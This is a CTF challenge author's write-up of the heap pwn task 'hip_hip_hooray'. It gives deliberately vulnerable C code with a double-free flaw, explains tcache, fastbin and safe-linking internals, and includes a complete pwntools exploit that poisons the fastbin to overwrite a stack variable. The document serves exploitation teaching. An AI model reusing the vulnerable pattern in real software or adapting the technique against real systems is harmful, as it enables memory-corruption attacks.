@@ -1,0 +1,300 @@
+---
+authors: [varik]
+date: 2024-12-23
+tags: [CTF, Cyhub2024, PWN]
+title: Cyhub CTF 2024 - hip_hip_hooray
+---
+
+# Cyhub CTF 2024 - hip_hip_hooray
+
+For Cyhub CTF 2024 in Armenia, I created a PWN challenge focused on exploiting the libc heap. Unfortunately, no team managed to solve it. Here’s a detailed breakdown of the challenge.
+
+## Challenge Description
+
+> Do you know the libc heap structure well enough? `0x2fr33`
+
+**Source code:**
+
+```c
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *notes[20] = {0};
+size_t notes_size = 0;
+
+void add_note() {
+
+  if (notes_size == 20) {
+    fprintf(stderr, "No more than 10 notes\n");
+    return;
+  }
+
+  fprintf(stderr, "Note size>> ");
+  unsigned int size = 0;
+  scanf("%u", &size);
+  while (fgetc(stdin) != '\n')
+    ;
+
+  if (size < 1 || size > 100) {
+    fprintf(stderr, "size should be > 0 and <= 100 \n");
+    return;
+  }
+
+  char *note = calloc(1, size);
+  fprintf(stderr, "Note content(%u)>> ", size);
+  fgets(note, size, stdin);
+  fprintf(stderr, "Address -> %p\n", note);
+
+  notes[notes_size++] = note;
+}
+
+void delete_note() {
+  fprintf(stderr, "Note index>> ");
+  unsigned int idx = 0;
+  scanf("%u", &idx);
+
+  if (idx > notes_size - 1) {
+    return;
+  }
+
+  free(notes[idx]);
+}
+
+void list_notes() {
+  printf("----- Notes -----\n");
+  for (unsigned int i = 0; i < notes_size; i++) {
+    printf("\%u -> %s\n", i, notes[i]);
+  }
+  fprintf(stderr, "\n");
+}
+
+void print_flag(char *flag, size_t *target) {
+  fprintf(stderr, "Checking if %p 's 3rd element is 0x1337\n", target);
+  if (target[2] != 0x1337) {
+    fprintf(stderr, "Flag is only for h4xors\n");
+    return;
+  }
+
+  fprintf(stderr, "%s\n", flag);
+}
+
+void menu() {
+  fprintf(
+      stderr,
+      "\n1 - Add note\n2 - List notes\n3 - Delete note\n4 - Print Flag\n5 - "
+      "Exit\n>> ");
+}
+
+int main() {
+  setbuf(stdout, NULL);
+  size_t target[3] = {0, 32, 0x31337};
+
+  /* Read the flag */
+  char flag[64] = {0};
+  FILE *fptr;
+  fptr = fopen("flag.txt", "r");
+  fgets(flag, 63, fptr);
+  fclose(fptr);
+  /* ============= */
+
+  unsigned int choice = 0;
+
+  while (1) {
+    menu();
+    scanf("%u", &choice);
+
+    switch (choice) {
+    case 1:
+      add_note();
+      break;
+    case 2:
+      list_notes();
+      break;
+    case 3:
+      delete_note();
+      break;
+    case 4:
+      print_flag(flag, target);
+      break;
+    case 5:
+      return 0;
+    default:
+      continue;
+    }
+  }
+
+  return 0;
+}
+```
+
+## Challenge Explanation
+
+The goal is to overwrite the `target` stack variable such that its third element becomes `0x1337`.
+This will allow the `print_flag` function to pass its check and print the flag.
+
+## Key Details About the Exploit
+
+**Why Do We Need to Fill the Tcache?**
+
+Modern libc implementations use tcache bins to optimize memory allocation. 
+If tcache bins are not full, all freed chunks are first stored there.
+So we need to fill up the `tcache` bin to make sure all subsequent `free` chunks will go to fastbin.
+
+**Why Can’t We Directly Double-Free?**
+
+Libc has protections to prevent double-free vulnerabilities. If you attempt to free the same chunk twice without freeing another chunk in between, libc will detect this misuse and terminate the program. To bypass this, we need to free a different chunk in between the two free calls, creating a cyclic chain in the fastbin.
+
+**What Is Safe Linking?**
+
+Safe linking is a security mechanism in modern libc versions to prevent arbitrary pointer overwrites in fastbin attacks.  
+When freeing a chunk, libc stores a "protected" pointer in the `fd` field of the chunk.  
+This pointer is calculated as:
+
+```fd = (chunk_address  >> 12) ^ target_address```
+
+More about safe linking can be found [here](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
+	
+**Why does the `target` variable already have `{0, 32}`?**
+
+To simplify the challenge and I have put the `malloc_chunk` header in the `target` variable, so solvers should only write the necessary data to the chunk.
+The `malloc_chunk` has the following structure:
+```c
+struct malloc_chunk {
+
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+```
+
+So in our case the `mchunk_prev_size` will be `0` and `mchunk_size` will be 32, so the chunk size check will be passed.
+
+## Exploitation Steps
+
+1. **Fill Up the Tcache Bins:**
+Allocate and free 7 notes to exhaust the tcache bins. After this, all further malloc and free operations will interact with the fastbin.
+
+**Heap bins view:**
+```
+Initial State: (Empty tcache and fastbin)
+After filling tcache: (Fastbin still empty)
+```
+
+2. **Trigger Double-Free:**
+Create 3 notes (indexes 7, 8, and 9). Free chunk 7, chunk 8, and then chunk 7 again to create a cyclic chain in the fastbin. This step is necessary to bypass libc’s double-free protection.
+
+**Heap bins view:**
+```
+Fastbin: [chunk7 → chunk8 → chunk7]
+```
+
+3. **Craft Fake Chunk:**
+Allocate a new chunk and overwrite its `fd` pointer to point to the `target` stack variable.  
+Because of safe linking, the `fd` must be calculated as ``(chunk_address >> 12) ^ target_address`.
+
+4. **Move Target to Fastbin Head:**
+Allocate two new chunks to move the `target` variable to the head of the fastbin.
+
+**Heap bins view:**
+```
+Fastbin: [target → chunk8 → chunk7]
+```
+
+5. **Overwrite Stack Variable:**
+Allocate a new chunk with the value `0x1337`.  
+This will overwrite the `target` stack variable since it is now at the fastbin head.
+
+6. **Print the Flag:**
+Call `print_flag`. The overwritten `target` variable will now pass the check, and the flag will be printed.
+
+
+**Full exploit code:**
+
+```python
+from pwn import *
+
+p = remote('127.0.0.1', 1337)
+
+def create_note(size, note):
+    p.recvuntil(b'>> ')
+    p.sendline(b'1')
+    p.recvuntil(b'>> ')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'>> ')
+    p.sendline(note)
+    p.recvuntil(b'Address -> ')
+    addr = p.recvline()[:-1]
+    return int(addr, 16)
+
+def delete_note(idx):
+    p.recvuntil(b'>> ')
+    p.sendline(b'3')
+    p.recvuntil(b'>> ')
+    p.sendline(str(idx).encode())
+
+def get_target_addr():
+    p.recvuntil(b'>> ')
+    p.sendline(b'4')
+    p.recvuntil(b'Checking if ')
+    addr = p.recvuntil(b"'s")[:-3]
+    return int(addr, 16)
+
+def print_flag():
+    p.recvuntil(b'>> ')
+    p.sendline(b'4')
+    print(p.recvuntil(b'>> ').decode())
+
+# fill up tcache, so any other malloc/free will be done on fastbin
+for i in range(7):
+    create_note(10, b'test')
+
+for i in range(7):
+    delete_note(i)
+#======================
+
+# Get target address
+target_addr = get_target_addr()
+print(f"Target variable is {hex(target_addr)}")
+
+# Trigger double-free to have cylic list in fastbin
+fbin_ptr = create_note(10, b'test')
+create_note(10, b'test')
+create_note(10, b'test')
+
+delete_note(7)
+delete_note(8)
+delete_note(7)
+
+# here we are setting new malloced chunk to (fbin_ptr >> 12) ^ target_addr
+# this is the target_addr but protected because of safe linking mechanism
+print(f"fastbin pointer is {hex(fbin_ptr)}")
+protected_addr = (fbin_ptr >> 12) ^ target_addr
+print(f"protected address is {hex(protected_addr)}")
+fbin_ptr2 = create_note(10, p64(protected_addr))
+assert(fbin_ptr == fbin_ptr2)
+print("fastbin is poisoned")
+
+# allocate 2 notes to set fake chunk to head
+create_note(10, b'test')
+create_note(10, b'test')
+
+# now the next allocation will point to our stack variable
+print("creating vulnerable note")
+create_note(10, p64(0x1337))
+print("vulnerable note created")
+
+print_flag()
+```
+
+This challenge showcases modern heap exploitation techniques using tcache, fastbins, safe-linking, and bypassing libc protections.
+
+The challenge source code can be found [here](https://github.com/var77/cyhubctf2024/tree/main/hip_hip_hooray)
